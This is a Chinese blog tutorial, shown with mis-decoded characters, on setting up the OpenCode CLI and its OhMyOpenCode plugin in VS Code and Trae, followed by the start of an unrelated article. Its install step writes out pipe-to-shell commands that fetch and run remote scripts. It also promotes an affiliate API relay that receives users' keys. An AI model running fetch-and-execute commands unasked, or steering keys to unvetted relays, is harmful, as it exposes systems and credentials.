<li>OhMyOpenCode æ˜¯ä»€ä¹ˆï¼ŸOpenCode çš„ç¤¾åŒºå¢å¼ºæ’ä»¶ï¼ˆä»£å· â€œSisyphusâ€ï¼‰ã€‚å®ƒä¸º OpenCode æ³¨å…¥äº†ç±»ä¼¼ Claude Code çš„å…¼å®¹å±‚ï¼Œæä¾›å®Œå–„çš„ Agent ä»»åŠ¡ç¼–æ’æœºåˆ¶ã€ç²¾é€‰ MCP å·¥å…·é“¾ä»¥åŠå¹¶è¡Œä»»åŠ¡å¤„ç†èƒ½åŠ›ï¼Œè¢«èª‰ä¸º â€œç”Ÿäº§åŠ›æ ¸å¼¹â€ã€‚</li>
</ul>
<p>ä¸ºä»€ä¹ˆé€‰æ‹©åœ¨ VS Code æˆ– Trae ä¸­ä½¿ç”¨å®ƒä»¬ï¼Ÿæ ¸å¿ƒåœ¨äºâ€œç»ˆç«¯é›†æˆâ€ã€‚ç°ä»£ IDE å¦‚ Trae å’Œ VS Code éƒ½æ‹¥æœ‰å¼ºå¤§çš„å†…ç½®ç»ˆç«¯ã€‚OpenCode è¿™ç§â€œç»ˆç«¯åŸç”Ÿâ€çš„å·¥å…·ï¼Œå¤©ç„¶é€‚åˆåµŒå…¥åˆ° IDE çš„ä¸‹åŠéƒ¨åˆ†é¢æ¿ä¸­ï¼šä½ å¯ä»¥åœ¨ç¼–è¾‘å™¨ä¸­æµè§ˆä»£ç ï¼ŒåŒæ—¶åœ¨ç»ˆç«¯é‡ŒæŒ‡æŒ¥ Agent è¿›è¡Œæ‰¹é‡é‡æ„ã€ç”Ÿæˆæ–‡æ¡£æˆ–è·¨æ–‡ä»¶åˆ†æã€‚è¿™ç§ç»„åˆæ—¢ä¿ç•™äº†å›¾å½¢ç•Œé¢çš„ç›´è§‚ï¼Œåˆè·å¾—äº†å‘½ä»¤è¡Œå·¥å…·çš„æè‡´æ•ˆç‡ã€‚</p>
<p>å…¸å‹ææ•ˆåœºæ™¯ï¼š</p>
<ul>
<li>æ‰¹é‡é‡æ„ï¼šâ€œå°† src ç›®å½•ä¸‹æ‰€æœ‰ç»„ä»¶çš„ Class å†™æ³•è½¬æ¢ä¸º Hooksã€‚â€</li>
<li>è„šæ‰‹æ¶ç”Ÿæˆï¼šâ€œåŸºäºå½“å‰çš„ schema.prisma æ–‡ä»¶ç”Ÿæˆå…¨å¥— CRUD æ¥å£ã€‚â€</li>
<li>è·¨é¡¹ç›®ä¸Šä¸‹æ–‡ï¼šè¯»å– legacy é¡¹ç›®çš„ä»£ç é€»è¾‘ï¼Œåº”ç”¨åˆ°å½“å‰çš„æ–°å¾®æœåŠ¡ä¸­ã€‚</li>
<li>æ–‡æ¡£ç»´æŠ¤ï¼šè‡ªåŠ¨åˆ†ææ”¹åŠ¨æ–‡ä»¶ï¼Œç”Ÿæˆå¯¹åº”çš„ CHANGELOG å’Œ API æ–‡æ¡£ã€‚</li>
</ul>
<h3 data-id="heading-2">ç¯å¢ƒå‡†å¤‡ä¸å®‰è£…ï¼ˆVS Code / Traeï¼‰</h3>
<p>è¦æ„å»ºè¿™å¥—å·¥ä½œæµï¼Œæˆ‘ä»¬éœ€è¦åˆ†å±‚å®‰è£…ï¼šå…ˆæ ¸å¿ƒï¼ˆOpenCode CLIï¼‰ï¼Œå†æ’ä»¶ï¼ˆIDE Extensionï¼‰ï¼Œæœ€åå¢å¼ºï¼ˆOhMyOpenCodeï¼‰ã€‚</p>
<h4 data-id="heading-3">1. å®‰è£… OpenCode æ ¸å¿ƒ</h4>
<p>OpenCode æ˜¯ä¸€ä¸ª Go è¯­è¨€ç¼–å†™çš„ç‹¬ç«‹ç¨‹åºï¼Œæ”¯æŒ macOSã€Linux å’Œ Windowsã€‚æ¨èä½¿ç”¨å®˜æ–¹è„šæœ¬è¿›è¡Œå®‰è£…ï¼Œä»¥ç¡®ä¿è·å–æœ€æ–°ç‰ˆæœ¬ï¼ˆæ”¯æŒ TUI æ¨¡å¼ï¼‰ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># macOS / Linux</span>
curl -sL https://opencode.ai/install | bash

<span class="hljs-comment"># Windows (PowerShell)</span>
iwr https://opencode.ai/install.ps1 | iex
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œåœ¨ä»»æ„ç»ˆç«¯è¾“å…¥ <code>opencode version</code> éªŒè¯æ˜¯å¦æˆåŠŸã€‚</p>
<h4 data-id="heading-4">2. åœ¨ VS Code ä¸­å®‰è£…æ‰©å±•</h4>
<p>ä¸ºäº†è·å¾—æ›´å¥½çš„ç¼–è¾‘å™¨è”åŠ¨ï¼ˆå¦‚ä»£ç é«˜äº® Diffã€ä¸€é”®åº”ç”¨ä»£ç å—ï¼‰ï¼Œå»ºè®®å®‰è£…å®˜æ–¹ VS Code æ‰©å±•ï¼š</p>
<ol>
<li>æ‰“å¼€ VS Code æ‰©å±•å¸‚åœºï¼ˆCtrl+Shift+Xï¼‰ã€‚</li>
<li>æœç´¢å¹¶å®‰è£…å®˜æ–¹æ‰©å±•ï¼š<code>sst-dev.opencode</code>ï¼ˆé¿å…åŒåä»¿å†’ï¼‰ã€‚</li>
<li>æ‰©å±•å¸‚åœºé“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsst-dev.opencode" target="_blank" title="https://marketplace.visualstudio.com/items?itemName=sst-dev.opencode" ref="nofollow noopener noreferrer">marketplace.visualstudio.com/items?itemNâ€¦</a></li>
</ol>
<h4 data-id="heading-5">3. åœ¨ Trae ä¸­é›†æˆ</h4>
<p>Trae æ˜¯åŸºäº VS Code äºŒæ¬¡å¼€å‘çš„ AI åŸç”Ÿ IDEï¼Œå¯¹ç»ˆç«¯å·¥å…·çš„æ”¯æŒéå¸¸å‹å¥½ã€‚åœ¨ Trae ä¸­é€šå¸¸æ— éœ€å®‰è£…é¢å¤–æ’ä»¶ï¼Œç›´æ¥åˆ©ç”¨å…¶å†…ç½®ç»ˆç«¯å³å¯å®Œç¾è¿è¡Œ OpenCode TUIï¼š</p>
<ol>
<li>æ‰“å¼€ Trae IDEã€‚</li>
<li>å”¤èµ·åº•éƒ¨ç»ˆç«¯é¢æ¿ï¼ˆTerminalï¼‰ã€‚</li>
<li>è¾“å…¥ <code>opencode</code> å¯åŠ¨äº¤äº’ä¼šè¯ã€‚</li>
</ol>
<h4 data-id="heading-6">4. å¯ç”¨ OhMyOpenCode å¢å¼º</h4>
<p>OhMyOpenCode æœ¬è´¨ä¸Šæ˜¯ä¸€ç»„ä¸º OpenCode è®¾è®¡çš„é«˜çº§é…ç½®è„šæœ¬å’Œæ’ä»¶åŒ…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨ç»ˆç«¯ä¸­è¿è¡Œ OpenCode çš„æ’ä»¶å®‰è£…å‘½ä»¤</span>
opencode plugin install code-yeongyu/oh-my-opencode
</code></pre>
<p>å®‰è£…åï¼ŒOpenCode ä¼šè‡ªåŠ¨åŠ è½½è¯¥å±‚å…¼å®¹é…ç½®ï¼Œä½ çš„ç•Œé¢æç¤ºç¬¦å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼ˆä¾‹å¦‚å˜ä¸º â€œSisyphusâ€ é£æ ¼ï¼‰ï¼Œè¿™æ ‡å¿—ç€ Multiâ€‘Agent å¼•æ“å·²å°±ç»ªã€‚</p>
<h3 data-id="heading-7">åœ¨ VS Code ä¸­é…ç½® OpenCode ä¸ OhMyOpenCode</h3>
<p>è™½ç„¶ OpenCode å¼€ç®±å³ç”¨ï¼Œä½†ä¸ºäº†è¾¾åˆ°æœ€ä½³ç”Ÿäº§åŠ›ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ VS Code çš„ <code>settings.json</code> ä¸­è¿›è¡Œä¸€äº›å…³é”®é…ç½®ï¼ŒåŒ…æ‹¬æ¨¡å‹é€‰æ‹©ã€å¯†é’¥æ³¨å…¥ä»¥åŠ OhMyOpenCode çš„ç‰¹å®šå¼€å…³ã€‚</p>
<p>æ¨èçš„â€œæœ€å°å¯ç”¨é…ç½®â€ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-jsonc" lang="jsonc">{
  // æ ¸å¿ƒæ¨¡å‹é…ç½®ï¼šæ”¯æŒ GLMâ€‘4.7, MiniMax, Claude ç­‰
  "opencode.provider": "bigmodel-glm",
  "opencode.apiKey": "${env:GLM_API_KEY}", // æ¨èä½¿ç”¨ç¯å¢ƒå˜é‡å¼•ç”¨ï¼Œæ›´å®‰å…¨

  // ä»£ç†ä¸ç½‘ç»œè®¾ç½®ï¼ˆå…³é”®ï¼‰
  "opencode.proxy": "http://127.0.0.1:7890",

  // å¹¶å‘æ§åˆ¶ï¼šå†³å®š Agent å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šå°‘ä¸ªæ–‡ä»¶æ“ä½œ
  "opencode.concurrency": 4,

  // OhMyOpenCode æ’ä»¶ç‰¹å®šé…ç½®
  "opencode.ohMyOpenCode.enabled": true,
  "opencode.ohMyOpenCode.agentMode": "collaborative", // å¼€å¯å¤šæ™ºèƒ½ä½“åä½œ
  "opencode.ohMyOpenCode.autoCommit": false // å»ºè®®è®¾ä¸º falseï¼Œäººå·¥ç¡®è®¤æäº¤
}
</code></pre>
<p>é…ç½®è¦ç‚¹ï¼š</p>
<ol>
<li>Providerï¼šæ ¹æ®é¢„ç®—ä¸åå¥½é€‰æ‹©ã€‚GLMâ€‘4.7 åœ¨ä¸­æ–‡ç†è§£å’Œæ€§ä»·æ¯”ä¸Šè¡¨ç°ä¼˜å¼‚ã€‚</li>
<li>Securityï¼šå°½é‡é¿å…å°† API Key æ˜æ–‡å†™å…¥é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡æ›´å®‰å…¨ã€‚</li>
<li>OhMyOpenCodeï¼šé€šè¿‡ <code>agentMode</code> æ§åˆ¶æ˜¯å¦å¯ç”¨å¤æ‚åä½œæ¨¡å¼ã€‚ç®€å•ä»»åŠ¡å¯ä¸´æ—¶åˆ‡æ¢ä¸º standard æ¨¡å¼ä»¥èŠ‚çœ Tokenã€‚</li>
</ol>
<h3 data-id="heading-8">ç»ˆç«¯/TUI å·¥ä½œæµï¼šåœ¨ä»»ä½•æ”¯æŒç»ˆç«¯çš„ IDE é‡Œç”¨ OpenCode</h3>
<p>OpenCode çš„ç²¾é«“åœ¨äº TUIï¼ˆTerminal User Interfaceï¼‰ã€‚æ— è®ºä½ ä½¿ç”¨çš„æ˜¯ VS Codeã€Trae è¿˜æ˜¯ IntelliJ IDEAï¼Œåªè¦æ‰“å¼€å†…ç½®ç»ˆç«¯ï¼Œå°±èƒ½è·å¾—ä¸€è‡´çš„ AI ç¼–ç¨‹ä½“éªŒã€‚</p>
<p>å…¸å‹å·¥ä½œæµå¾ªç¯ï¼š</p>
<ol>
<li>å¯åŠ¨ä¼šè¯ï¼šåœ¨ç»ˆç«¯è¾“å…¥ <code>opencode</code> è¿›å…¥äº¤äº’æ¨¡å¼ã€‚</li>
<li>åŠ è½½ä¸Šä¸‹æ–‡ï¼šä½¿ç”¨ <code>/add src/utils/*.ts</code> å°†ç›¸å…³ä»£ç æ–‡ä»¶åŠ å…¥ AI çš„ä¸Šä¸‹æ–‡çª—å£ã€‚</li>
<li>ä¸‹è¾¾æŒ‡ä»¤ï¼šè¾“å…¥è‡ªç„¶è¯­è¨€ï¼Œä¾‹å¦‚â€œåˆ†æè¿™äº›å·¥å…·å‡½æ•°ï¼Œä¸ºå®ƒä»¬ç¼–å†™å•å…ƒæµ‹è¯•ï¼Œä¿å­˜åœ¨ tests/ ç›®å½•ä¸‹â€ã€‚</li>
<li>å®¡æŸ¥ä¸åº”ç”¨ï¼šOpenCode ä¼šç”Ÿæˆ Diff é¢„è§ˆã€‚æŒ‰ <code>y</code> ç¡®è®¤åº”ç”¨ï¼ŒæŒ‰ <code>n</code> æ‹’ç»ï¼Œæˆ–è¾“å…¥åé¦ˆç»§ç»­ä¿®æ”¹ã€‚</li>
<li>ä»»åŠ¡é˜Ÿåˆ—ï¼šåœ¨ OhMyOpenCode æ¨¡å¼ä¸‹ï¼Œå¤æ‚ä»»åŠ¡ä¼šè¢«æ‹†è§£ä¸ºå­ä»»åŠ¡é˜Ÿåˆ—ï¼ŒAgent å¯å¹¶è¡Œå¤„ç†å¤šä¸ªæ–‡ä»¶ã€‚</li>
</ol>
<p>åœ¨ Trae è¿™ç±» AI åŸç”Ÿ IDE ä¸­ï¼Œç»ˆç«¯ä½“éªŒå°¤ä¸ºæµç•…ã€‚ä½ å¯ä»¥å°†ç»ˆç«¯é¢æ¿æœ€å¤§åŒ–ï¼Œä¸“æ³¨äºä¸ AI çš„å¯¹è¯ï¼Œè€Œç”Ÿæˆçš„ä»£ç ä¼šå®æ—¶åŒæ­¥åˆ°ä¸Šæ–¹çš„ç¼–è¾‘å™¨è§†å›¾ä¸­ã€‚</p>
<h3 data-id="heading-9">OhMyOpenCode çš„å¢å¼ºä¸å–èˆ</h3>
<p>å®‰è£…äº† OhMyOpenCode ä¹‹åï¼ŒOpenCode å°±ä»ä¸€ä¸ªâ€œå¬è¯çš„å®ä¹ ç”Ÿâ€å˜æˆäº†â€œä¸»åŠ¨çš„é«˜çº§å·¥ç¨‹å¸ˆå›¢é˜Ÿâ€ã€‚ä½†è¿™ç§èƒ½åŠ›çš„æå‡ä¹Ÿä¼´éšç€æˆæœ¬çš„æƒè¡¡ã€‚</p>
<p>ä¼˜åŠ¿ï¼ˆProsï¼‰ï¼š</p>
<ul>
<li>Multiâ€‘Agent åä½œï¼šè‡ªåŠ¨æ‹†è§£ä»»åŠ¡ï¼Œç”±ä¸åŒçš„å­ Agent è´Ÿè´£è§„åˆ’ã€ç¼–ç ã€æµ‹è¯•ã€‚</li>
<li>Claude Code å…¼å®¹å±‚ï¼šè®© OpenCode èƒ½å¤Ÿç†è§£å¤æ‚çš„ Claude é£æ ¼ promptï¼Œå¹¶åœ¨é€»è¾‘æ¨ç†ä¸Šæ›´æ¥è¿‘é—­æºç«å“ã€‚</li>
<li>å·¥å…·é“¾é›†æˆï¼šå†…ç½®å¸¸ç”¨ LSPã€AST å·¥å…·ï¼Œä»£ç ç†è§£æ›´ç²¾å‡†ã€‚</li>
</ul>
<p>æƒè¡¡ï¼ˆConsï¼‰ï¼š</p>
<ul>
<li>Token æ¶ˆè€—æ¿€å¢ï¼šå¤š Agent æ„å‘³ç€å¤šè½®å†…éƒ¨å¯¹è¯ï¼Œæ¶ˆè€—é‡å¯èƒ½æ˜¯æ ‡å‡†æ¨¡å¼çš„ 3â€‘5 å€ã€‚</li>
<li>é€Ÿåº¦å»¶è¿Ÿï¼šå¤æ‚çš„è§„åˆ’é˜¶æ®µéœ€è¦æ—¶é—´ï¼Œä¸é€‚åˆâ€œæ”¹ä¸€ä¸ªæ ‡ç‚¹â€è¿™ç§å¾®å°ä»»åŠ¡ã€‚</li>
<li>ç¨³å®šæ€§ä¾èµ–ï¼šå¼ºä¾èµ–åº•å±‚å¤§æ¨¡å‹çš„ç¨³å®šæ€§ï¼Œä¸€æ—¦ API æ³¢åŠ¨ï¼Œä»»åŠ¡é“¾å¯èƒ½ä¸­æ–­ã€‚</li>
</ul>
<h3 data-id="heading-10">å¸¸è§é—®é¢˜ä¸æ’é”™</h3>
<ul>
<li>API Key æœªç”Ÿæ•ˆ/æŠ¥é”™ 401ï¼šæ£€æŸ¥ç¯å¢ƒå˜é‡ <code>GLM_API_KEY</code> æ˜¯å¦å·²åœ¨ Shellï¼ˆå¦‚ .zshrcï¼‰ä¸­å¯¼å‡ºã€‚VS Code æœ‰æ—¶æ— æ³•è¯»å–æœ€æ–°çš„ Shell å˜é‡ï¼Œå°è¯•åœ¨ <code>settings.json</code> ä¸­ç›´æ¥å¡«å…¥ï¼ˆä»…æµ‹è¯•ç”¨ï¼‰æˆ–é‡å¯ VS Codeã€‚</li>
<li>æ‰©å±•å†²çªï¼šOpenCode å¯èƒ½ä¸ GitHub Copilot æˆ– Cursor æŠ¢å å¿«æ·é”®ã€‚å»ºè®®ä¸º OpenCode è®¾ç½®ç‹¬ç«‹å¿«æ·é”®æ˜ å°„ï¼Œé¿å…å†²çªã€‚</li>
<li>ç»ˆç«¯ç½‘ç»œè¶…æ—¶ï¼šå…¬å¸å†…ç½‘åœºæ™¯éœ€ç‹¬ç«‹ä»£ç†é…ç½®ã€‚ç¡®ä¿åœ¨é…ç½®æ–‡ä»¶ä¸­æ­£ç¡®è®¾ç½® <code>http_proxy</code> æˆ– <code>opencode.proxy</code> å­—æ®µã€‚</li>
<li>Trae ç‰¹å®šå»ºè®®ï¼šå¦‚æœ OpenCode æ— æ³•å†™å…¥æ–‡ä»¶ï¼Œæ£€æŸ¥ Trae çš„ â€œWorkspace Trustâ€ è®¾ç½®ï¼Œç¡®ä¿å½“å‰å·¥ä½œåŒºæ˜¯å—ä¿¡ä»»çš„ã€‚</li>
</ul>
<h3 data-id="heading-11">opencode.jsonï¼šè‡ªå®šä¹‰ä¾›åº”å•† baseURL ä¸ä»£ç†é…ç½®</h3>
<pre><code class="hljs language-text" lang="text">å¯ä»¥é…ç½®ä½¿ç”¨ https://ai.t8star.cn/register?aff=U7mw51175  ä¸­è½¬ç«™ï¼Œ
å„ç§æ¨¡å‹éƒ½æœ‰ï¼Œåœ¨ä¸‹æ–¹çš„baseURLæ”¹æˆhttps://ai.t8star.cn/v1 å°±å¯ä»¥ã€‚
</code></pre>
<p>é™¤äº†åœ¨ IDE æ’ä»¶ä¸­é…ç½®ï¼ŒOpenCode è¿˜æ”¯æŒé€šè¿‡ <code>opencode.json</code> æ–‡ä»¶è¿›è¡Œæ›´åº•å±‚çš„å‚æ•°è°ƒä¼˜ã€‚è¿™å¯¹äºéœ€è¦å°†å®˜æ–¹ API åœ°å€ï¼ˆå¦‚ Anthropicã€OpenAIï¼‰åˆ‡æ¢ä¸ºä¼ä¸šå†…éƒ¨ä»£ç†ã€æœ¬åœ°è½¬å‘æœåŠ¡æˆ–ç¬¬ä¸‰æ–¹ä¸­è½¬ç«™çš„å¼€å‘è€…å°¤ä¸ºé‡è¦ã€‚</p>
<p>å…¸å‹é…ç½®ç¤ºä¾‹ï¼ˆå°† <code>anthropic</code> çš„ <code>options.baseURL</code> æŒ‡å‘æœ¬åœ°æˆ–ç¬¬ä¸‰æ–¹ä»£ç†ï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"providers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"anthropic"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"options"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"baseURL"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://127.0.0.1:8045/v1"</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"claude-sonnet-4-5-thinking"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Claude Sonnet 4.5 Thinking (CC)"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"attachment"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"limit"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
              <span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1048576</span><span class="hljs-punctuation">,</span>
              <span class="hljs-attr">"output"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">65535</span>
            <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"modalities"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
              <span class="hljs-attr">"input"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
                <span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span>
                <span class="hljs-string">"image"</span><span class="hljs-punctuation">,</span>
                <span class="hljs-string">"pdf"</span>
              <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
              <span class="hljs-attr">"output"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
                <span class="hljs-string">"text"</span>
              <span class="hljs-punctuation">]</span>
            <span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>é…ç½®ç”Ÿæ•ˆä¸éªŒè¯å®Œæ•´æ­¥éª¤ï¼š</p>
<ol>
<li>æ–°å¼€ä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œæ‰§è¡Œè®¤è¯å‘½ä»¤ï¼š<code>opencode auth login</code>ã€‚</li>
<li>åœ¨äº¤äº’ç•Œé¢ä¸­é€‰æ‹©ä¾›åº”å•† <code>anthropic</code>ã€‚</li>
<li>é€‰æ‹©â€œè¾“å…¥ apikeyâ€ï¼Œå°†ç¬¬ä¸‰æ–¹ä¸­è½¬ç«™çš„ key ç²˜è´´è¿›å»ã€‚</li>
<li>ç™»å½•æˆåŠŸåï¼Œåœ¨ OpenCode ç•Œé¢è¾“å…¥ <code>/models</code> æŒ‡ä»¤ã€‚å¦‚æœé…ç½®æ­£ç¡®ï¼Œä½ åº”è¯¥èƒ½çœ‹åˆ°è¯¥ä¾›åº”å•†æ——ä¸‹çš„æ¨¡å‹åˆ—è¡¨å·²æ­£å¸¸åŠ è½½ã€‚</li>
</ol>
<p>å®‰å…¨ä¸åˆè§„æç¤ºï¼š</p>
<ul>
<li>ç§˜é’¥å®‰å…¨ï¼šå°½é‡é¿å…åœ¨ <code>opencode.json</code> ä¸­æ˜æ–‡ç¡¬ç¼–ç  apikeyï¼Œä¼˜å…ˆä½¿ç”¨ç¯å¢ƒå˜é‡ã€‚</li>
<li>åˆè§„æ€§ï¼šç¡®ä¿ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹ä¸­è½¬ç«™æˆ–ä»£ç†æœåŠ¡ç¬¦åˆæ‰€åœ¨å…¬å¸çš„å®‰å…¨åˆè§„è¦æ±‚ã€‚</li>
</ul>
<h3 data-id="heading-12">ç”Ÿæ€å…¨æ™¯ï¼šå·¥å…·è§’è‰²å®šä½</h3>
<p>æœ€åï¼Œç†æ¸…ä¸‰è€…å…³ç³»ï¼šOpenCode æ˜¯æ ¸å¿ƒ AI å¼•æ“ï¼ŒOhMyOpenCode æ˜¯å®ƒçš„â€œå¤§è„‘å¢å¼ºåŒ…â€ï¼Œè€Œ VS Code ä¸ Trae åˆ™æ˜¯å®ƒä»¬æ–½å±•æ‹³è„šçš„èˆå°ã€‚</p>
<hr/>
<h4 data-id="heading-13">å‚è€ƒä¸è¿›ä¸€æ­¥é˜…è¯»</h4>
<ul>
<li>OpenCodeï¼ˆä¸­æ–‡èµ„æ–™èšåˆï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fai-bot.cn%2Fopencode%2F" target="_blank" title="https://ai-bot.cn/opencode/" ref="nofollow noopener noreferrer">ai-bot.cn/opencode/</a></li>
<li>OpenCode å®˜æ–¹ IDE æ•´åˆæ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2Fdocs%2Fide%2F" target="_blank" title="https://opencode.ai/docs/ide/" ref="nofollow noopener noreferrer">opencode.ai/docs/ide/</a></li>
<li>OpenCode VS Code æ‰©å±•ï¼ˆå®˜æ–¹ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsst-dev.opencode" target="_blank" title="https://marketplace.visualstudio.com/items?itemName=sst-dev.opencode" ref="nofollow noopener noreferrer">marketplace.visualstudio.com/items?itemNâ€¦</a></li>
<li>OpenCode æ’ä»¶æœºåˆ¶æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2Fdocs%2Fplugins%2F" target="_blank" title="https://opencode.ai/docs/plugins/" ref="nofollow noopener noreferrer">opencode.ai/docs/pluginâ€¦</a></li>
<li>OhMyOpenCodeï¼ˆç¤¾åŒºä»‹ç»ä¸è®¨è®ºï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoding.csdn.net%2F695e7679ea53844658f53369.html" target="_blank" title="https://aicoding.csdn.net/695e7679ea53844658f53369.html" ref="nofollow noopener noreferrer">aicoding.csdn.net/695e7679ea5â€¦</a></li>
<li>Trae IDE å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftraeide.com%2F" target="_blank" title="https://traeide.com/" ref="nofollow noopener noreferrer">traeide.com/</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript Date è¯­æ³•è¦è¿‡æ—¶äº†ï¼ä»¥åç”¨è¿™ä¸ªæ›¿ä»£ï¼]]></title>    <link>https://juejin.cn/post/7593139476832616491</link>    <guid>https://juejin.cn/post/7593139476832616491</guid>    <pubDate>2026-01-09T03:52:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593139476832616491" data-draft-id="7593139476832600107" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" JavaScript Date è¯­æ³•è¦è¿‡æ—¶äº†ï¼ä»¥åç”¨è¿™ä¸ªæ›¿ä»£ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-09T03:52:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             JavaScript Date è¯­æ³•è¦è¿‡æ—¶äº†ï¼ä»¥åç”¨è¿™ä¸ªæ›¿ä»£ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:52:13.000Z" title="Fri Jan 09 2026 03:52:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid 